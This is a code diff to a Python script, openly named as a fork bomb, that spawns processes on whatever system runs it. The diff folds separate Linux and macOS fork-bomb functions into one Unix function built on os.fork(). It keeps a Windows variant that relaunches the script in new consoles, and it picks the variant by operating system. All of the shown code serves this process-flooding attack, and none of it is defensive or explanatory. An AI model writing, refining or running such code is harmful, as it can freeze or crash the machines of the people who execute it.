@@ -30,14 +30,7 @@ def forkbombwin(i):
         subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
         if i == 6:
             break
-def forkbomblin(i):
-    os.fork()
-    while i != 6:
-        i += 6
-        os.fork()
-        if i == 6:
-            break
-def forkbombmac(i):
+def forkbombunix(i):
     os.fork()
     while i != 6:
         i += 6
@@ -50,7 +43,5 @@ def forkbombmac(i):
 
 if opsys == "Windows":
     forkbombwin(i)
-if opsys == "Linux":
-    forkbomblin(i)
-if opsys == "Darwin":
-    forkbombmac(i)
+if opsys == "Linux" or opsys == "Darwin":
+    forkbombunix(i)
